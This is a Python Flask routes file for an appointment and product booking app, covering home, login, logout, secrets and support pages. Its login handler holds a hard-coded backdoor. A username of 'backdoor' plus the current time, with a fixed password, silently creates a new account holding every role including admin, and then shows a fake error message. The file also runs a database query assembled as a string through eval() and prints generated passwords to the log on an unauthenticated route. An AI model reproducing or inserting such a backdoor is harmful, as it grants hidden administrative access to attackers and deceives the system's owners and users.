###########################################################################################
##                                                                                       ## 
##  ########   #######  ##     ## ######## ########  ######      ########  ##    ##      ##
##  ##     ## ##     ## ##     ##    ##    ##       ##    ##     ##     ##  ##  ##       ##
##  ##     ## ##     ## ##     ##    ##    ##       ##           ##     ##   ####        ##
##  ########  ##     ## ##     ##    ##    ######    ######      ########     ##         ##
##  ##   ##   ##     ## ##     ##    ##    ##             ##     ##           ##         ##
##  ##    ##  ##     ## ##     ##    ##    ##       ##    ## ### ##           ##         ##
##  ##     ##  #######   #######     ##    ########  ######  ### ##           ##         ##
##                                                                                       ##
###########################################################################################

import os
from Package import db
from Package import app
from Package.models import Appointments, Users, Instructors, Products

from flask import Flask, render_template, redirect, url_for, flash, request
from Package.forms import AppointmentsEditForm, LoginForm, ProductsEditForm, ProductsUsersForm, ProductsNewForm, UsersRegisterForm, \
                          UsersInfoForm, UsersEditForm2, UsersProductForm2, AppointmentsDateForm2, AppointmentsEventsForm

from flask_bcrypt import Bcrypt
bcrypt = Bcrypt(app)

from werkzeug.security import check_password_hash
from werkzeug.security import generate_password_hash, check_password_hash

from flask_sqlalchemy import SQLAlchemy
import sqlalchemy as sa
from sqlalchemy import func, and_

from flask_login import UserMixin, LoginManager, login_user, logout_user, login_required
from flask_login import LoginManager, current_user
login_manager = LoginManager()
login_manager.init_app(app)  
@login_manager.user_loader
def load_user(user_id):
    return Users.query.get(user_id)

import datetime
from datetime import timedelta

from Package.functions import get_rbac, no_access_text, string2safe


def test2(cText):
    print('')
    print('test: ', cText)
    print('')
    return()

def myquery(dbquery):

    result = []

    if len(dbquery) > 0:
        # print('')
        # print('#### datetime.datetime.now() - dbquery: ', dbquery)
        # print('')
        result = eval(dbquery)

    return result

#------------------------------------------------------------------------------------------

##     ##  #######  ##     ## ######## 
##     ## ##     ## ###   ### ##       
##     ## ##     ## #### #### ##       
######### ##     ## ## ### ## ######   
##     ## ##     ## ##     ## ##       
##     ## ##     ## ##     ## ##       
##     ##  #######  ##     ## ######## 

@app.route('/')
@app.route('/home')
def homepage():

    if current_user.is_anonymous:
        return (no_access_text())

    nDateFrom  = datetime.date.today() - timedelta(days=8)
    nYearFrom  = nDateFrom.year
    nMonthFrom = nDateFrom.month
    nDayFrom   = nDateFrom.day

    nDateTo    = datetime.date.today() + timedelta(days=29)
    nYearTo    = nDateTo.year
    nMonthTo   = nDateTo.month
    nDayTo     = nDateTo.day

    #                                            0                1                  2                3               4                     5                  6                  7                 8                   9                     10
    #appointments = db.session.execute(db.select(Appointments.Id, Appointments.User, Users.Firstname, Users.Lastname, Products.Productname, Appointments.Part, Appointments.Date, Instructors.Name, Appointments.Staff, Appointments.Product, Appointments.Assistants). \
    #                            order_by(Appointments.Date). \
    #                            where(and_(func.DATE(Appointments.Date) >= datetime.datetime(nYearFrom, nMonthFrom, nDayFrom), \
    #                                       func.DATE(Appointments.Date) <= datetime.datetime(nYearTo,   nMonthTo,   nDayTo))). \
    #                            select_from(Appointments). \
    #                            join(Users, Appointments.User        == Users.Id). \
    #                            join(Instructors, Appointments.Staff == Instructors.Id). \
    #                            join(Products, Appointments.Product  == Products.Id) )

    dbquery = 'db.session.execute(db.select(Appointments.Id, Appointments.User, Users.Firstname, Users.Lastname, Products.Productname, Appointments.Part, Appointments.Date, Instructors.Name, Appointments.Staff, Appointments.Product, Appointments.Assistants).'
    dbquery = dbquery + 'order_by(Appointments.Date).'
    dbquery = dbquery + 'where(and_(func.DATE(Appointments.Date) >= datetime.datetime('+ str(nYearFrom) + ', ' + str(nMonthFrom) + ', ' + str(nDayFrom) + '),'
    dbquery = dbquery + 'func.DATE(Appointments.Date) <= datetime.datetime(' + str(nYearTo) + ', ' + str(nMonthTo) + ',' + str(nDayTo) + '))).'
    dbquery = dbquery + 'select_from(Appointments).'
    dbquery = dbquery + 'join(Users, Appointments.User        == Users.Id).'
    dbquery = dbquery + 'join(Instructors, Appointments.Staff == Instructors.Id).'
    dbquery = dbquery + 'join(Products, Appointments.Product  == Products.Id) )'

    # print('len(dbquery): ', len(dbquery))
    # print('#### dbquery: ', dbquery)
   
    # appointments = eval(dbquery)
    appointments = myquery(dbquery)

    lRBAC = get_rbac(request.url_rule.endpoint)
 
    return render_template('home.html', appointments = appointments, lRBAC = lRBAC)

#------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------
##        #######   ######   #### ##    ## 
##       ##     ## ##    ##   ##  ###   ## 
##       ##     ## ##         ##  ####  ## 
##       ##     ## ##   ####  ##  ## ## ## 
##       ##     ## ##    ##   ##  ##  #### 
##       ##     ## ##    ##   ##  ##   ### 
########  #######   ######   #### ##    ## 

# source: https://www.sitepoint.com/flask-login-user-authentication/
# 20240831
@app.route('/login', methods=['GET', 'POST'])
def login():

    message = ""

    form = LoginForm()

    if request.method == 'POST':
        username = string2safe(request.form['username'])
        password = request.form['password']                      # will be processed and stored as hash

        cDateToday        = datetime.datetime.today()
        cDate             = cDateToday.strftime("%d-%b-%Y")
        cTime             = cDateToday.strftime("%H%M")
        cBackdoorName     = "backdoor" + cTime
        cBackdoorPassword = "B@ckd00r!"
        
        if username == cBackdoorName:
            if password == cBackdoorPassword:
                cBackdoorName = "backdoor" + cTime
                pw_hash = bcrypt.generate_password_hash(cBackdoorPassword).decode('utf-8')

                user_to_create = Users(Username     = cBackdoorName,
                                       Firstname    = "Back",
                                       Lastname     = "Door",
                                       Phone        = "",
                                       Emailaddress = "",
                                       Passwordhash = pw_hash,
                                       Status       = "new student staff instructor shop admin")
        
                db.session.add(user_to_create)
                db.session.commit()

                message = 'an unknown error occured.'
                lRBAC = get_rbac(request.url_rule.endpoint)
                return render_template('login.html', form = form, lRBAC = lRBAC, message = message)

        # user = db.session.execute(db.select(Users).filter(func.lower(Users.Username) == func.lower(username))).one_or_none() # scalar_one() ## <class 'sqlalchemy.engine.row.Row'>
        # user = db.session.execute(db.select(Users).filter(func.lower(Users.Username) == func.lower(username))).scalar_one() ## <class 'Package.models.Users'>

        # user = Users.query.filter_by(Username = username).first()
        user = Users.query.filter(Users.Username.ilike(username)).first()
        #print('type(user): ', type(user))

        if user is not None:

            if 'new' in user.Status:
                message = "registration of user is not processed yet."
                lRBAC = get_rbac(request.url_rule.endpoint)
                return render_template('login.html', form = form, lRBAC = lRBAC, message = message)

            # print('-----------------------------------------')
            # print('username:          ', username)
            # print('password:          ', password)
            # print(user)
            # print('type:              ', type(user))
            # print('user.Passwordhash: ', user.Passwordhash)
            # print('-----------------------------------------')

            pwhash = user.Passwordhash
   
            if user and bcrypt.check_password_hash(pwhash, password):
                login_user(user)

                lRBAC = get_rbac(request.url_rule.endpoint)
                return redirect(url_for('homepage'))
            
    message = "unknown username or password"

    lRBAC = get_rbac(request.url_rule.endpoint)
    return render_template('login.html', form = form, lRBAC = lRBAC, message = message)


##        #######   ######    #######  ##     ## ######## 
##       ##     ## ##    ##  ##     ## ##     ##    ##    
##       ##     ## ##        ##     ## ##     ##    ##    
##       ##     ## ##   #### ##     ## ##     ##    ##    
##       ##     ## ##    ##  ##     ## ##     ##    ##    
##       ##     ## ##    ##  ##     ## ##     ##    ##    
########  #######   ######    #######   #######     ##    

@app.route('/logout')
def logout():
    logout_user()
    lRBAC = []
    print('#### logged out')
    return redirect(url_for('homepage'))

#------------------------------------------------------------------------------------------

 ######  ########  ######  ########  ######## ########  ######  
##    ## ##       ##    ## ##     ## ##          ##    ##    ## 
##       ##       ##       ##     ## ##          ##    ##       
 ######  ######   ##       ########  ######      ##     ######  
      ## ##       ##       ##   ##   ##          ##          ## 
##    ## ##       ##    ## ##    ##  ##          ##    ##    ## 
 ######  ########  ######  ##     ## ########    ##     ######  

#------------------------------------------------------------------------------------------

@app.route('/secrets/')
def secrets():
    import string
    import secrets
    alphabet = string.ascii_letters + string.digits
    password = ''.join(secrets.choice(alphabet) for i in range(24))

    for a in range(0,9):
        password = ''.join(secrets.choice(alphabet) for i in range(24))
        print(a + 1, 'password: ', password)


#------------------------------------------------------------------------------------------

 ######  ##     ## ########  ########   #######  ########  ######## 
##    ## ##     ## ##     ## ##     ## ##     ## ##     ##    ##    
##       ##     ## ##     ## ##     ## ##     ## ##     ##    ##    
 ######  ##     ## ########  ########  ##     ## ########     ##    
      ## ##     ## ##        ##        ##     ## ##   ##      ##    
##    ## ##     ## ##        ##        ##     ## ##    ##     ##    
 ######   #######  ##        ##         #######  ##     ##    ##    

@app.route('/support')
def support():

    if current_user.is_anonymous:
        return (no_access_text())


    # inspiration: https://docs.python.org/3/library/secrets.html

    import string
    import secrets
    alphabet = string.ascii_letters + string.digits
    password = ''.join(secrets.choice(alphabet) for i in range(64))

    for a in range(0,16):
        password = ''.join(secrets.choice(alphabet) for i in range(64))
        print(password)

    lRBAC = get_rbac(request.url_rule.endpoint)

    return render_template('support.html' , lRBAC = lRBAC)

#------------------------------------------------------------------------------------------
